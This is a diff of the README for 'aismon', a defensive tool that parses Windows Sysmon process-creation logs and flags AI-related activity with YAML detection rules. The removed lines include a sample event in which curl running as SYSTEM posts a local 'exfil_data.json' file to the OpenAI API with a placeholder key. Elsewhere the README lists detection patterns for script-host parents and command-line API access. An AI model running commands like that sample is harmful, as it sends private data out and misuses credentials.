@@ -1,181 +1,180 @@
-# sysmon-parser
+# aismon
 
-A Sysmon log parser that detects unauthorized AI and LLM activity on Windows endpoints.
+`aismon` examines Windows Sysmon process-creation events for AI-related activity.
 
-## The Mission
+It reads Sysmon Event ID 1 XML exports, extracts the process details that matter during triage, and compares each event with a set of YAML detection rules. Matches can identify local model runners, AI desktop applications, model downloads, AI API references, exposed API credentials, and AI activity running in a suspicious context.
 
-Cybersecurity professionals at all career stages are new to AI tooling. As a community, we can lessen the learning curve by creating tools that lift each other up.
+The tool reports observable activity. A match does not determine whether the activity was authorized or malicious. That decision belongs to the analyst and the organization's AI usage policy.
 
-Imagine an intern who fires up AutoGPT with an internal API pasted into the command line. What about a compromised host that curls sensitive data to the OpenAI API under SYSTEM in the cloak of night?
+## Project origin
 
-Now imagine that we have the ability to prevent these mishaps and all of the damage that would follow. These events show up in Sysmon logs, but nobody wrote detection rules for them. Until now.
+This project began with a Sysmon parser assignment in the AI Cyber Defense Ops course provided by Just Hacking Training through the Women in CyberSecurity Cyber Competency Builder program.
 
-sysmon-parser reads Sysmon XML exports, extracts critical fields from Process Creation events (Event ID 1), and runs them through 35 purpose-built detection rules that flag AI/LLM threats across six categories.
+The initial prototype was built iteratively with Claude Code. I expanded the assignment into an AI activity detector, then reviewed the code, corrected its handling of real Windows Event XML, hardened its inputs, recalibrated the detection logic, and added tests for security and false-positive cases.
 
-## Detection Categories
+The review history is documented in [`docs/PROJECT_REVIEW.md`](docs/PROJECT_REVIEW.md).
 
-| Category | What It Catches | Example Rules |
-|---|---|---|
-| **Local Inference** | Unauthorized LLM servers on endpoints | Ollama, llama.cpp, vLLM, KoboldCpp, LM Studio, GPT4All |
-| **Model Downloads** | Model acquisition activity | HuggingFace pulls, GGUF/SafeTensors files, CivitAI |
-| **GPU/Compute Abuse** | Unauthorized ML workloads | PyTorch, TensorFlow, CUDA toolkit, nvidia-smi |
-| **AI Attack Tooling** | Offensive AI frameworks and credential exposure | AutoGPT, PentestGPT, API keys in CLI args, vendor API calls |
-| **Exfiltration** | Data leaving through AI channels | curl to AI APIs, script engine spawns, SYSTEM-context AI tools |
-| **Shadow AI** | Policy-violating AI usage | ChatGPT/Claude desktop apps, Stable Diffusion, Whisper |
+## What it detects
 
-Every detection includes a severity level (low, medium, high, critical) and a MITRE ATT&CK mapping.
+The repository contains 35 rules across six categories.
 
-## Quick Start
+| Category | Examples |
+|---|---|
+| Local inference | Ollama, llama.cpp, vLLM, KoboldCpp, LM Studio, GPT4All |
+| Model acquisition | Hugging Face references, Ollama pulls, GGUF, SafeTensors, CivitAI |
+| GPU and compute activity | PyTorch, TensorFlow, CUDA, `nvidia-smi` |
+| AI security and agent tooling | PentestGPT, AutoGPT, CrewAI, AI service credentials in command lines |
+| Suspicious context | Script-host parent processes, SYSTEM integrity, user-writable directories, command-line AI API access |
+| Shadow AI indicators | ChatGPT, Claude Desktop, Copilot CLI, Stable Diffusion, Whisper |
+
+Each match includes a rule ID, description, severity, category, and tags. Severity represents investigation priority. Analysts still determine what the activity means in their environment.
+
+## Requirements
+
+- Python 3.10 or newer
+- PyYAML 6.x
+
+## Installation
+
+Clone the repository and create a virtual environment:
 
 ```bash
-git clone https://github.com/jennshaggy/sysmon-parser.git
-cd sysmon-parser
-pip install pyyaml
+git clone https://github.com/jennshaggy/aismon.git
+cd aismon
+python -m venv .venv
 ```
 
-Parse a Sysmon XML file:
+Activate the environment on macOS or Linux:
+
+```bash
+source .venv/bin/activate
+```
+
+Activate it on Windows PowerShell:
+
+```powershell
+.venv\Scripts\Activate.ps1
+```
+
+Install the runtime dependency:
+
+```bash
+python -m pip install -r requirements.txt
+```
+
+## Usage
+
+Parse Event ID 1 records and return JSON:
 
 ```bash
 python parser.py samples/event1.xml
 ```
 
-Run with threat detection enabled:
+Run the detection rules:
 
 ```bash
-python parser.py samples/event_exfil_ai.xml --detect
+python parser.py samples/event_ollama.xml --detect
 ```
 
-Only show events that triggered rules:
+Return only events with detections:
 
 ```bash
 python parser.py samples/event_exfil_ai.xml --detect-only
 ```
 
-## Usage
+Filter parsed events:
 
-```
-python parser.py <file.xml> [options]
-
-Options:
-  --detect              Run AI/LLM threat detection rules against events
-  --detect-only         Only output events that trigger detection rules
-  --image TEXT          Filter by process image (substring, case-insensitive)
-  --user TEXT           Filter by user (exact match)
-  --integrity-level     Filter by integrity level (High, Medium, Low, System)
+```bash
+python parser.py events.xml --image powershell
+python parser.py events.xml --user "DOMAIN\username"
+python parser.py events.xml --integrity-level System
 ```
 
-All filters can be combined. Output is JSON to stdout.
+Filters can be combined. The image filter is case-insensitive and accepts a partial path or process name. User and integrity-level filters require exact values.
 
-## Sample Output
+## Example detection
 
-Given a Sysmon event where `curl.exe` runs as SYSTEM and POSTs data to the OpenAI API (spawned by `wscript.exe` from a VBS file in ProgramData):
+The supplied `event_exfil_ai.xml` fixture describes `curl.exe` accessing an AI API from SYSTEM context after being launched by `wscript.exe`. Its command line also contains a sample API key.
 
 ```json
 {
-  "EventID": 1,
-  "Computer": "FINANCE-PC03",
-  "UtcTime": "2024-03-10 02:44:18.993",
-  "Image": "C:\\Windows\\System32\\curl.exe",
-  "CommandLine": "curl.exe -X POST https://api.openai.com/v1/chat/completions -H \"Authorization: Bearer sk-proj-abc123\" -d @C:\\Users\\Public\\exfil_data.json",
-  "User": "NT AUTHORITY\\SYSTEM",
-  "IntegrityLevel": "System",
-  "ParentImage": "C:\\Windows\\System32\\wscript.exe",
-  "detections": [
-    {
-      "rule_id": "AI-023",
-      "name": "AI API Key in Command Line",
-      "severity": "critical",
-      "mitre": {"tactic": "Credential Access", "technique": "T1552.001"}
-    },
-    {
-      "rule_id": "AI-026",
-      "name": "AI Tool Spawned from Script Engine",
-      "severity": "critical",
-      "mitre": {"tactic": "Execution", "technique": "T1059.005"}
-    },
-    {
-      "rule_id": "AI-028",
-      "name": "AI Tool with SYSTEM Privileges",
-      "severity": "critical",
-      "mitre": {"tactic": "Privilege Escalation", "technique": "T1078"}
-    },
-    {
-      "rule_id": "AI-029",
-      "name": "Curl/Wget to AI API Endpoint",
-      "severity": "high",
-      "mitre": {"tactic": "Exfiltration", "technique": "T1048"}
-    }
+  "rule_id": "AI-023",
+  "name": "AI API Key in Command Line",
+  "description": "AI service credential appears in process command-line arguments",
+  "severity": "critical",
+  "category": "ai_attack_tooling",
+  "tags": [
+    "credential-exposure",
+    "api-key"
   ]
 }
 ```
 
-Five rules fire. Three are critical. The event tells a clear story: a scheduled VBS script running as SYSTEM is exfiltrating data through the OpenAI API using a leaked project key.
+The credential is available to the detection engine but is replaced with `[REDACTED]` before JSON is printed.
 
-## Writing Your Own Rules
+## Input format
 
-Detection rules live in `detections/` as YAML files. Drop in a new file and the engine picks it up automatically.
+`aismon` accepts XML containing one or more Windows Event records. It supports the namespace used by Windows Event Viewer XML exports.
 
-```yaml
-rules:
-  - id: CUSTOM-001
-    name: Internal Model Server Detected
-    description: Custom model serving endpoint running on workstation
-    severity: high
-    category: local_inference
-    mitre:
-      tactic: Execution
-      technique: T1059.006
-    match:
-      commandline_contains:
-        - my-internal-model-server
-        - custom-inference-api
-```
+The parser extracts these Event ID 1 fields when present:
 
-Match conditions (all must be true when combined):
-- `image_contains` - substring match on process path
-- `commandline_contains` - substring match on command line
-- `parent_image_contains` - substring match on parent process path
-- `integrity_level` - exact match on integrity level (High, Medium, Low, System)
+- `EventID`
+- `Computer`
+- `UtcTime`
+- `Image`
+- `CommandLine`
+- `User`
+- `IntegrityLevel`
+- `ParentImage`
+- `ParentCommandLine`
+- `Hashes`
 
-## Fields Extracted
+The current version does not read binary `.evtx` files and does not collect live events from an endpoint.
 
-From every Sysmon Event ID 1 (Process Creation):
+## Detection rules
 
-| Field | Source |
-|---|---|
-| EventID | System > EventID |
-| Computer | System > Computer |
-| UtcTime | EventData |
-| Image | EventData |
-| CommandLine | EventData |
-| User | EventData |
-| IntegrityLevel | EventData |
-| ParentImage | EventData |
-| ParentCommandLine | EventData |
-| Hashes | EventData |
+Rules are stored in `detections/` as YAML. Multiple match fields use AND logic. Values inside one match field use OR logic.
 
-## Running Tests
+Supported match fields:
+
+- `image_name`: exact executable basename, case-insensitive
+- `image_contains`: partial process-path match, case-insensitive
+- `commandline_contains`: partial command-line match, case-insensitive
+- `commandline_words`: boundary-aware command term match, case-insensitive
+- `parent_image_contains`: partial parent-process path match, case-insensitive
+- `integrity_level`: exact integrity-level match
+
+Rule files are schema-checked when loaded. Unsupported match fields, invalid values, duplicate rule IDs, and individual rule files larger than 1 MiB are rejected.
+
+## Security behavior
+
+- XML DTD and entity declarations are rejected.
+- XML is processed incrementally instead of loading the complete document into memory.
+- Common AI API keys and bearer tokens are redacted from command-line fields before output.
+- Detection runs before redaction so credential-exposure rules still work.
+- YAML is parsed with `safe_load` and validated before use.
+
+## Tests
+
+Install the development dependencies and run the complete suite:
 
 ```bash
-python -m pytest tests/ -v
+python -m pip install -r requirements-dev.txt
+python -m pytest
 ```
 
-56 tests cover parsing, filtering, rule loading, detection matching across all categories, false positive validation, and end-to-end integration with sample Sysmon XML.
+The current suite contains 69 tests covering XML parsing, Windows namespaces, filtering, credential redaction, rule validation, matching behavior, false-positive cases, and sample-file integration.
 
-## Requirements
+GitHub Actions runs the suite on Python 3.10, 3.12, and 3.14 for every pull request and every push to `main`.
 
-- Python 3.8+
-- PyYAML
+## Current limitations
 
-No other dependencies. The parser uses only the Python standard library for XML parsing, argument handling, and JSON output.
-
-## Who This Is For
-
-- **SOC analysts** triaging Sysmon alerts who want to catch AI-related threats their SIEM rules miss
-- **Insider threat teams** monitoring for unauthorized model execution and data exfiltration through AI APIs
-- **Compliance teams** enforcing organizational AI usage policies
-- **Detection engineers** building AI-specific signatures for their environment
+- Event ID 1 provides process context, not network payloads or proof of data transfer.
+- Rules identify activity for review. They do not know an organization's approved software or users.
+- Detection is based on process paths and command-line text. Renamed tools or missing command-line logging can evade matching.
+- The included benign cases are targeted regression tests, not a measured enterprise false-positive rate.
+- Output is JSON. CSV, JSONL, live collection, `.evtx` parsing, and SIEM integration are not implemented.
 
 ## License
 
-MIT
+MIT License. See [`LICENSE`](LICENSE).
